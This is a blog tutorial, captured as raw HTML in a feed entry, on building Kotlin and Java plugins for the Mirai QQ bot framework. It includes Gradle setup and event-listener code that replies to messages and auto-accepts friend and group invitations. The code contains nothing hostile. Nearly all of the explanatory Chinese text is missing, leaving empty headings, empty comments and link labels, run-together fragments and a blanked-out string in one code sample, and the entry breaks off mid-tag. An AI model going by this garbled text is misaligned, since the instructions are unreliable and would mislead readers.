      <url>/2020/12/28/Mirai-qq%E6%9C%BA%E5%99%A8%E4%BA%BA%E6%A1%86%E6%9E%B6kotlin_java%E6%95%99%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>miraimirai-console<br><br><code>mcl</code> - mirai-console-loadermirai-console<br><code>mirai</code> - mirai  QQ Android <code>AGPLv3</code></p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p><br><a href="https://github.com/mamoe/mirai">miraigithub</a><br><a href="https://github.com/mamoe/mirai-console">mirai-consolegithub</a><br><a href="https://github.com/iTXTech/mirai-console-loader">mirai-console-loader(mcl)github</a><br><a href="https://github.com/mamoe/mirai/blob/dev/docs/mirai-ecology.md"></a><br><a href="https://github.com/project-mirai/mirai-hello-world"></a><br><a href="https://mirai.mamoe.net/">mirai</a><br><a href="https://github.com/project-mirai/mirai-console-plugin-template">demo</a><br><a href="https://docs.mamoe.net/">miraiapi</a></p><p>:<br><a href="https://github.com/Nambers/mirai_plugin_example">mirai-consolektjava)</a></p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><ul><li>MiraiOKmcl()</li><li>openjdkjdk(openjdk, )</li><li><a href="https://github.com/mamoe/mirai/issues/959">issue#959</a>200+</li><li>id(xxx.xxx.xxx)</li><li>tx()</li><li></li><li><a href="https://mirai.mamoe.net/">mirai</a></li><li>mclloginconfig&#x2F;console&#x2F;autologin.yml</li><li>mcl<code></code><a href="https://mirai.mamoe.net/topic/223/%E6%97%A0%E6%B3%95%E7%99%BB%E5%BD%95%E7%9A%84%E4%B8%B4%E6%97%B6%E5%A4%84%E7%90%86%E6%96%B9%E6%A1%88"></a></li><li><code>resources\META-INF\services\net.mamoe.mirai.console.plugin.jvm.JvmPlugin</code></li></ul><h2 id="1-"><a href="#1-" class="headerlink" title="1."></a>1.</h2><h3 id="i-java"><a href="#i-java" class="headerlink" title="i. java"></a>i. java</h3><p>mcl&gt;&#x3D;11openjdk<a href="http://jdk.java.net/archive/">openjdk</a></p><blockquote><p>openjdk(Oracle)jdk<a href="https://github.com/mamoe/mirai/discussions/779"></a></p></blockquote><h3 id="ii-IDE"><a href="#ii-IDE" class="headerlink" title="ii. IDE"></a>ii. IDE</h3><p>IDEAIDEA<br>:<br><a href="https://plugins.jetbrains.com/plugin/15094-mirai-console">Mirai Console IntelliJ </a><br><a href="https://plugins.jetbrains.com/plugin/14816-kotlin-jvm-blocking-bridge">Kotlin Jvm Blocking Bridge  Java  Kotlin suspend </a><br><a href="https://github.com/mamoe/mirai-console/blob/master/docs/Preparations.md"></a></p><h3 id="iii-mirai-console-loader-mcl-"><a href="#iii-mirai-console-loader-mcl-" class="headerlink" title="iii. mirai-console-loader(mcl)"></a>iii. mirai-console-loader(mcl)</h3><p><a href="https://github.com/iTXTech/mirai-console-loader"></a><br></p><h4 id=""><a href="#" class="headerlink" title=""></a></h4><p><a href="https://github.com/mamoe/mirai-console/blob/master/docs/ConfiguringProjects.md#%E6%A8%A1%E5%9D%97%E8%AF%B4%E6%98%8E"></a></p><h2 id="2-mirai-console"><a href="#2-mirai-console" class="headerlink" title="2.mirai-console"></a>2.mirai-console</h2><h3 id="i-"><a href="#i-" class="headerlink" title="i. "></a>i. </h3><ol><li><a href="https://github.com/project-mirai/mirai-hello-world"></a><a href="https://github.com/Nambers/mirai_plugin_example">mirai-console</a>IDE</li><li><a href="https://github.com/mamoe/mirai/blob/dev/docs/Preparations.md#%E5%AE%89%E8%A3%85-ide-%E6%8F%92%E4%BB%B6"></a></li></ol><h3 id="ii-"><a href="#ii-" class="headerlink" title="ii. "></a>ii. </h3><ul><li><code>settings.gradle.kts</code>.jar, build.gradle.ktsshadowjar:<figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">tasks &#123;</span><br><span class="line">    afterEvaluate &#123;</span><br><span class="line">        named&lt;net.mamoe.mirai.console.gradle.BuildMiraiPluginTask&gt;(<span class="string">&quot;buildPlugin&quot;</span>) &#123;</span><br><span class="line">            archiveBaseName.<span class="keyword">set</span>(<span class="string">&quot;name&quot;</span>)</span><br><span class="line">            archiveClassifier.<span class="keyword">set</span>(<span class="string">&quot;&quot;</span>)</span><br><span class="line">            archiveVersion.<span class="keyword">set</span>(version)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><code>RunMiraikt</code>(test)idemcl</li><li><code>buildPlugin</code>gradle.jar</li><li><code>src/main/kotlin/PluginMain</code>(mcl)</li><li><code>PluginMain.kt</code><code>JavaPluginMain.java</code>,<code>resources\META-INF\services\net.mamoe.mirai.console.plugin.jvm.JvmPlugin</code></li></ul><h2 id="3-"><a href="#3-" class="headerlink" title="3. "></a>3. </h2><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">  build.gradle.kts gradle</span><br><span class="line">  settings.gradle.kts gradle</span><br><span class="line"></span><br><span class="line">.run</span><br><span class="line">      RunMiraiKt.run.xml IDERunMiraiKt</span><br><span class="line"></span><br><span class="line">run RunMiraiKt</span><br><span class="line"></span><br><span class="line">src</span><br><span class="line">    main</span><br><span class="line">      kotlin</span><br><span class="line">            PluginMain.kt  kotlin</span><br><span class="line">      Java</span><br><span class="line">            JavaPluginMain.java java</span><br><span class="line">      </span><br><span class="line">     resources\META-INF\services</span><br><span class="line">        net.mamoe.mirai.console.plugin.jvm.JvmPlugin Mirai</span><br><span class="line">    test</span><br><span class="line">        kotlin</span><br><span class="line">                RunMirai.kt RunMiraiKt</span><br></pre></td></tr></table></figure><h2 id="4-kotlin"><a href="#4-kotlin" class="headerlink" title="4.kotlin"></a>4.kotlin</h2><p><strong>github</strong></p><h3 id="i-"><a href="#i-" class="headerlink" title="i."></a>i.</h3><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="keyword">import</span> net.mamoe.mirai.console.plugin.jvm.JvmPluginDescription</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="keyword">import</span> net.mamoe.mirai.console.plugin.jvm.KotlinPlugin</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="keyword">import</span> net.mamoe.mirai.event.events.BotInvitedJoinGroupRequestEvent</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="keyword">import</span> net.mamoe.mirai.event.events.FriendMessageEvent</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="keyword">import</span> net.mamoe.mirai.event.events.GroupMessageEvent</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="keyword">import</span> net.mamoe.mirai.event.events.NewFriendRequestEvent</span><br><span class="line"><span class="comment">//(logger)</span></span><br><span class="line"><span class="keyword">import</span> net.mamoe.mirai.utils.info</span><br><span class="line"><span class="comment">//(messageChain)</span></span><br><span class="line"><span class="keyword">import</span> net.mamoe.mirai.message.<span class="keyword">data</span>.Image</span><br><span class="line"><span class="comment">//(messageChain)</span></span><br><span class="line"><span class="keyword">import</span> net.mamoe.mirai.message.<span class="keyword">data</span>.PlainText</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="keyword">import</span> net.mamoe.mirai.event.Listener</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="keyword">import</span> net.mamoe.mirai.event.globalEventChannel</span><br><span class="line"><span class="comment">//?</span></span><br><span class="line"><span class="keyword">import</span> kotlin.coroutines.EmptyCoroutineContext</span><br></pre></td></tr></table></figure><p><a href="https://github.com/mamoe/mirai/blob/dev/docs/Events.md"></a></p><h3 id="ii-"><a href="#ii-" class="headerlink" title="ii."></a>ii.</h3><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">object</span> PluginMain : KotlinPlugin(</span><br><span class="line">    JvmPluginDescription(</span><br><span class="line">        id = <span class="string">&quot;org.example.mirai-example&quot;</span>,</span><br><span class="line">        version = <span class="string">&quot;0.1.0&quot;</span></span><br><span class="line">    )</span><br><span class="line">) &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>kotlinPlugin</code>plugin<code>JvmPluginDescription</code></p><h3 id="iii-"><a href="#iii-" class="headerlink" title="iii."></a>iii.</h3><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">override</span> <span class="function"><span class="keyword">fun</span> <span class="title">onEnable</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">//logger.info(&quot;xxx&quot;)</span></span><br><span class="line">   logger.info &#123; <span class="string">&quot;Plugin loaded&quot;</span> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>kotlin<code>override</code><code>logger.info()</code><code>logger</code><code>kotlinPlugin</code><code>.info()</code><code>.warning()</code><code>.error()</code></p><h3 id="iv-"><a href="#iv-" class="headerlink" title="iv."></a>iv.</h3><p><code> subscribeAlways&lt;&gt;&#123;&#125;</code><code>onEnable</code>(<code>subscribe</code><code>subscribeOnce</code>mirai)</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">globalEventChannel().subscribeAlways&lt;GroupMessageEvent&gt;&#123;</span><br><span class="line">          <span class="comment">//</span></span><br><span class="line">          <span class="keyword">if</span> (message.contentToString().startsWith(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">              group.sendMessage(message.contentToString().replace(<span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span> (message.contentToString() == <span class="string">&quot;hi&quot;</span>) &#123;</span><br><span class="line">              group.sendMessage(<span class="string">&quot;hi&quot;</span>)</span><br><span class="line">          &#125;</span><br><span class="line">          message.forEach &#123;</span><br><span class="line">              <span class="comment">//</span></span><br><span class="line">              <span class="keyword">if</span> (it <span class="keyword">is</span> Image) &#123;</span><br><span class="line">                  <span class="comment">//</span></span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">if</span> (it <span class="keyword">is</span> PlainText) &#123;</span><br><span class="line">                  <span class="comment">//</span></span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      globalEventChannel().subscribeAlways&lt;FriendMessageEvent&gt;&#123;</span><br><span class="line">          <span class="comment">//</span></span><br><span class="line">      &#125;</span><br><span class="line">      globalEventChannel().subscribeAlways&lt;NewFriendRequestEvent&gt;&#123;</span><br><span class="line">          <span class="comment">//</span></span><br><span class="line">          accept()</span><br><span class="line">      &#125;</span><br><span class="line">      globalEventChannel().subscribeAlways&lt;BotInvitedJoinGroupRequestEvent&gt;&#123;</span><br><span class="line">          <span class="comment">//</span></span><br><span class="line">          accept()</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><h3 id="v-"><a href="#v-" class="headerlink" title="v. "></a>v. </h3><p><a href="https://github.com/Nambers/mirai_kotlin_example">mirai-consolekotlin</a></p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.mirai.plugin</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> net.mamoe.mirai.console.plugin.jvm.JvmPluginDescription</span><br><span class="line"><span class="keyword">import</span> net.mamoe.mirai.console.plugin.jvm.KotlinPlugin</span><br><span class="line"><span class="keyword">import</span> net.mamoe.mirai.event.Listener</span><br><span class="line"><span class="keyword">import</span> net.mamoe.mirai.event.events.BotInvitedJoinGroupRequestEvent</span><br><span class="line"><span class="keyword">import</span> net.mamoe.mirai.event.events.FriendMessageEvent</span><br><span class="line"><span class="keyword">import</span> net.mamoe.mirai.event.events.GroupMessageEvent</span><br><span class="line"><span class="keyword">import</span> net.mamoe.mirai.event.events.NewFriendRequestEvent</span><br><span class="line"><span class="keyword">import</span> net.mamoe.mirai.event.globalEventChannel</span><br><span class="line"><span class="keyword">import</span> net.mamoe.mirai.message.code.MiraiCode</span><br><span class="line"><span class="keyword">import</span> net.mamoe.mirai.utils.info</span><br><span class="line"><span class="keyword">import</span> net.mamoe.mirai.message.<span class="keyword">data</span>.Image</span><br><span class="line"><span class="keyword">import</span> net.mamoe.mirai.message.<span class="keyword">data</span>.Image.Key.queryUrl</span><br><span class="line"><span class="keyword">import</span> net.mamoe.mirai.message.<span class="keyword">data</span>.PlainText</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">kotlin</span></span><br><span class="line"><span class="comment">src/main/resources/META-INF.services/net.mamoe.mirai.console.plugin.jvm.JvmPlugin</span></span><br><span class="line"><span class="comment">&quot;org.example.mirai.plugin.PluginMain&quot;</span></span><br><span class="line"><span class="comment">ktjava</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">settings.gradle.kts.jar</span></span><br><span class="line"><span class="comment">build.gradle.kts</span></span><br><span class="line"><span class="comment">JvmPluginDescriptionid</span></span><br><span class="line"><span class="comment">runmiraiktidemcl</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">object</span> PluginMain : KotlinPlugin(</span><br><span class="line">    JvmPluginDescription(</span><br><span class="line">        id = <span class="string">&quot;org.example.mirai-example&quot;</span>,</span><br><span class="line">        name = <span class="string">&quot;&quot;</span>,</span><br><span class="line">        version = <span class="string">&quot;0.1.0&quot;</span></span><br><span class="line">    )</span><br><span class="line">) &#123;</span><br><span class="line">    <span class="keyword">override</span> <span class="function"><span class="keyword">fun</span> <span class="title">onEnable</span><span class="params">()</span></span> &#123;</span><br><span class="line">        logger.info &#123; <span class="string">&quot;Plugin loaded&quot;</span> &#125;</span><br><span class="line">        <span class="comment">// &quot;$&#123;dataFolder.absolutePath&#125;/&quot;</span></span><br><span class="line"></span><br><span class="line">        globalEventChannel().subscribeAlways&lt;GroupMessageEvent&gt;&#123;</span><br><span class="line">            <span class="comment">//</span></span><br><span class="line">            group.sendMessage(<span class="string">&quot;\uD83D\uDE03&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        globalEventChannel().subscribeAlways&lt;FriendMessageEvent&gt;&#123;</span><br><span class="line">            <span class="comment">//</span></span><br><span class="line">            sender.sendMessage(<span class="string">&quot;hi&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        globalEventChannel().subscribeAlways&lt;NewFriendRequestEvent&gt;&#123;</span><br><span class="line">            <span class="comment">//</span></span><br><span class="line">            accept()</span><br><span class="line">        &#125;</span><br><span class="line">        globalEventChannel().subscribeAlways&lt;BotInvitedJoinGroupRequestEvent&gt;&#123;</span><br><span class="line">            <span class="comment">//</span></span><br><span class="line">            accept()</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="vi-gradle"><a href="#vi-gradle" class="headerlink" title="vi. gradle"></a>vi. gradle</h3><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">plugins &#123;</span><br><span class="line">    val kotlinVersion = <span class="string">&quot;1.4.30&quot;</span></span><br><span class="line">    kotlin(<span class="string">&quot;jvm&quot;</span>) version kotlinVersion</span><br><span class="line">    kotlin(<span class="string">&quot;plugin.serialization&quot;</span>) version kotlinVersion</span><br><span class="line">    id(<span class="string">&quot;net.mamoe.mirai-console&quot;</span>) version <span class="string">&quot;2.3.2&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">group = <span class="string">&quot;org.example&quot;</span></span><br><span class="line">version = <span class="string">&quot;0.1.0&quot;</span></span><br><span class="line"></span><br><span class="line">repositories &#123;</span><br><span class="line">    jcenter()</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    maven &#123; url =uri(<span class="string">&quot;https://mirrors.huaweicloud.com/repository/maven&quot;</span>) &#125;</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    maven &#123; url =uri(<span class="string">&quot;https://maven.aliyun.com/nexus/content/repositories/jcenter&quot;</span>)&#125;</span><br><span class="line">    <span class="comment">//mirai-console</span></span><br><span class="line">    maven &#123;url = uri(<span class="string">&quot;https://dl.bintray.com/him188moe/mirai&quot;</span>)&#125;</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// maven &#123; url = uri(&quot;https://dl.bintray.com/karlatemp/misc&quot;) &#125;</span></span><br><span class="line">    mavenLocal()</span><br><span class="line">    mavenCentral()</span><br><span class="line">&#125;</span><br><span class="line">dependencies&#123;</span><br><span class="line">    <span class="comment">//IDEmclhttps://github.com/project-mirai/mirai-login-solver-selenium</span></span><br><span class="line">    <span class="comment">//runtimeOnly(&quot;net.mamoe:mirai-login-solver-selenium:1.0-dev-15&quot;)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>2.3.2</code><a href="https://github.com/mamoe/mirai-console/blob/master/docs/ConfiguringProjects.md#%E9%80%89%E6%8B%A9%E7%89%88%E6%9C%AC"></a><br><img src="/images/Mirai-qq%E6%9C%BA%E5%99%A8%E4%BA%BA%E6%A1%86%E6%9E%B6kotlin_java%E6%95%99%E7%A8%8B.md-0.png" alt=""></p><h2 id="5-Java"><a href="#5-Java" class="headerlink" title="5. Java"></a>5. Java</h2><h3 id="i-"><a href="#i-" class="headerlink" title="i. "></a>i. </h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> net.mamoe.mirai.console.plugin.jvm.JavaPlugin;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="keyword">import</span> net.mamoe.mirai.console.plugin.jvm.JvmPluginDescriptionBuilder;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="keyword">import</span> net.mamoe.mirai.event.GlobalEventChannel;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="keyword">import</span> net.mamoe.mirai.event.events.FriendMessageEvent;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="keyword">import</span> net.mamoe.mirai.event.events.GroupMessageEvent;</span><br><span class="line"><span class="comment">//</span></span><br></pre></td></tr></table></figure><h3 id="ii--1"><a href="#ii--1" class="headerlink" title="ii. "></a>ii. </h3><p>miraiJavaPlugin</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">JavaPluginMain</span> <span class="keyword">extends</span> <span class="title class_">JavaPlugin</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">JavaPluginMain</span> <span class="variable">INSTANCE</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JavaPluginMain</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">JavaPluginMain</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(<span class="keyword">new</span> <span class="title class_">JvmPluginDescriptionBuilder</span>(<span class="string">&quot;org.example.mirai-example&quot;</span>, <span class="string">&quot;0.1.0&quot;</span>)</span><br><span class="line">                .info(<span class="string">&quot;EG&quot;</span>)</span><br><span class="line">                .build());</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>JvmPluginDescriptionBuilder</code></p><h3 id="iii--1"><a href="#iii--1" class="headerlink" title="iii. "></a>iii. </h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onEnable</span><span class="params">()</span> &#123;</span><br><span class="line">        getLogger().info(<span class="string">&quot;&quot;</span>);</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure><p><code>getLogger()</code><code>.info()</code></p><h3 id="iv--1"><a href="#iv--1" class="headerlink" title="iv. "></a>iv. </h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GlobalEventChannel.INSTANCE.subscribeAlways(GroupMessageEvent.class, g -&gt; &#123;</span><br><span class="line">            <span class="comment">//</span></span><br><span class="line">            getLogger().info(g.getMessage().contentToString());</span><br><span class="line"></span><br><span class="line">        &#125;);</span><br><span class="line">        GlobalEventChannel.INSTANCE.subscribeAlways(FriendMessageEvent.class, f -&gt; &#123;</span><br><span class="line">            <span class="comment">//</span></span><br><span class="line">            getLogger().info(f.getMessage().contentToString());</span><br><span class="line">        &#125;);</span><br></pre></td></tr></table></figure><h3 id="v--1"><a href="#v--1" class="headerlink" title="v. "></a>v. </h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.mirai.plugin;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> net.mamoe.mirai.console.plugin.jvm.JavaPlugin;</span><br><span class="line"><span class="keyword">import</span> net.mamoe.mirai.console.plugin.jvm.JvmPluginDescriptionBuilder;</span><br><span class="line"><span class="keyword">import</span> net.mamoe.mirai.event.GlobalEventChannel;</span><br><span class="line"><span class="keyword">import</span> net.mamoe.mirai.event.events.FriendMessageEvent;</span><br><span class="line"><span class="keyword">import</span> net.mamoe.mirai.event.events.GroupMessageEvent;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">JavaPluginMain</span> <span class="keyword">extends</span> <span class="title class_">JavaPlugin</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">JavaPluginMain</span> <span class="variable">INSTANCE</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JavaPluginMain</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">JavaPluginMain</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(<span class="keyword">new</span> <span class="title class_">JvmPluginDescriptionBuilder</span>(<span class="string">&quot;org.example.mirai-example&quot;</span>, <span class="string">&quot;0.1.0&quot;</span>)</span><br><span class="line">                .info(<span class="string">&quot;EG&quot;</span>)</span><br><span class="line">                .build());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onEnable</span><span class="params">()</span> &#123;</span><br><span class="line">        getLogger().info(<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">        GlobalEventChannel.INSTANCE.subscribeAlways(GroupMessageEvent.class, g -&gt; &#123;</span><br><span class="line">            <span class="comment">//</span></span><br><span class="line">            getLogger().info(g.getMessage().contentToString());</span><br><span class="line"></span><br><span class="line">        &#125;);</span><br><span class="line">        GlobalEventChannel.INSTANCE.subscribeAlways(FriendMessageEvent.class, f -&gt; &#123;</span><br><span class="line">            <span class="comment">//</span></span><br><span class="line">            getLogger().info(f.getMessage().contentToString());</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="vi-gradle-"><a href="#vi-gradle-" class="headerlink" title="vi. gradle "></a>vi. gradle </h3><p><code>#4-vi.-gradle-</code></p><h2 id="6-IDE"><a href="#6-IDE" class="headerlink" title="6. IDE"></a>6. IDE</h2><h3 id="i-MiraiRunKt"><a href="#i-MiraiRunKt" class="headerlink" title="i. MiraiRunKt"></a>i. MiraiRunKt</h3><p><code>/src/test/kotlin/RunMirai.kt</code>qq<br>run</p><h3 id="ii-MiraiRunKt"><a href="#ii-MiraiRunKt" class="headerlink" title="ii.MiraiRunKt"></a>ii.MiraiRunKt</h3><p><br><img src="/images/Mirai-qq%E6%9C%BA%E5%99%A8%E4%BA%BA%E6%A1%86%E6%9E%B6kotlin_java%E6%95%99%E7%A8%8B.md-1.png" alt=""><br>run<br><img src="/images/Mirai-qq%E6%9C%BA%E5%99%A8%E4%BA%BA%E6%A1%86%E6%9E%B6kotlin_java%E6%95%99%E7%A8%8B.md-2.png" alt="run"><br><br><img src="/images/Mirai-qq%E6%9C%BA%E5%99%A8%E4%BA%BA%E6%A1%86%E6%9E%B6kotlin_java%E6%95%99%E7%A8%8B.md-3.png" alt=""></p><h2 id="7-"><a href="#7-" class="headerlink" title="7. "></a>7. </h2><h3 id="i-"><a href="#i-" 